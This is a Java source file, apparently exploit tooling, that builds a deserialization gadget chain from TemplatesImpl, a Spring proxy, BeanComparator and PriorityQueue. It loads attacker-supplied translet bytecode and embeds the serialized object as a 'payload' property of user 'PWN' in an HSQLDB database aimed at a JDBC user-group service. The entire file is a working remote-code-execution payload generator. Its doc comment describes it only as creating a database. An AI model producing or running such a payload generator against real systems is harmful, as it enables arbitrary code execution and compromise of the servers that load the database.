import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.Statement;
import java.util.PriorityQueue;
import javax.xml.transform.Templates;
import org.apache.commons.beanutils.BeanComparator;
import org.springframework.aop.framework.ProxyFactory;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

/** Creates the closed HSQLDB database consumed by the JDBC user-group service. */
public final class GeneratePayload {
    private static void setField(Object target, String name, Object value) throws Exception {
        Field field = target.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(target, value);
    }

    private static PriorityQueue<Object> makeObjectGraph(Path transletClass) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][] {Files.readAllBytes(transletClass)});
        setField(templates, "_name", "die.verwandlung.CommandTranslet");
        setField(templates, "_tfactory", new TransformerFactoryImpl());
        setField(templates, "_transletIndex", 0);

        ProxyFactory proxyFactory = new ProxyFactory();
        proxyFactory.setTarget(templates);
        proxyFactory.setInterfaces(Templates.class);
        Object templatesProxy = proxyFactory.getProxy();

        BeanComparator<Object> comparator = new BeanComparator<>();
        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add("1");
        queue.add("1");
        comparator.setProperty("outputProperties");

        Field backingField = PriorityQueue.class.getDeclaredField("queue");
        backingField.setAccessible(true);
        Object[] backing = (Object[]) backingField.get(queue);
        backing[0] = templatesProxy;
        backing[1] = templatesProxy;
        return queue;
    }

    private static void createDatabase(Path database, Object graph) throws Exception {
        Class.forName("org.hsqldb.jdbc.JDBCDriver");
        try (Connection connection =
                        DriverManager.getConnection(
                                "jdbc:hsqldb:file:" + database.toAbsolutePath(), "SA", "");
                Statement statement = connection.createStatement()) {
            statement.execute(
                    "CREATE TABLE users(name VARCHAR(128) PRIMARY KEY, password VARCHAR(254), enabled CHAR(1) NOT NULL)");
            statement.execute(
                    "CREATE TABLE user_props(username VARCHAR(128), propname VARCHAR(64), propvalue OTHER, PRIMARY KEY(username, propname))");
            statement.execute(
                    "CREATE TABLE groups(name VARCHAR(128) PRIMARY KEY, enabled CHAR(1) NOT NULL)");
            statement.execute(
                    "CREATE TABLE group_members(groupname VARCHAR(128), username VARCHAR(128), PRIMARY KEY(groupname, username))");
            statement.execute("INSERT INTO users VALUES ('PWN', '', 'Y')");
            try (PreparedStatement insert =
                    connection.prepareStatement(
                            "INSERT INTO user_props(username, propname, propvalue) VALUES (?, ?, ?)")) {
                insert.setString(1, "PWN");
                insert.setString(2, "payload");
                insert.setObject(3, graph);
                insert.executeUpdate();
            }
            statement.execute("SHUTDOWN SCRIPT");
        }
    }

    public static void main(String[] arguments) throws Exception {
        if (arguments.length != 2) {
            throw new IllegalArgumentException(
                    "usage: GeneratePayload CommandTranslet.class database-base");
        }
        createDatabase(Path.of(arguments[1]), makeObjectGraph(Path.of(arguments[0])));
    }
}
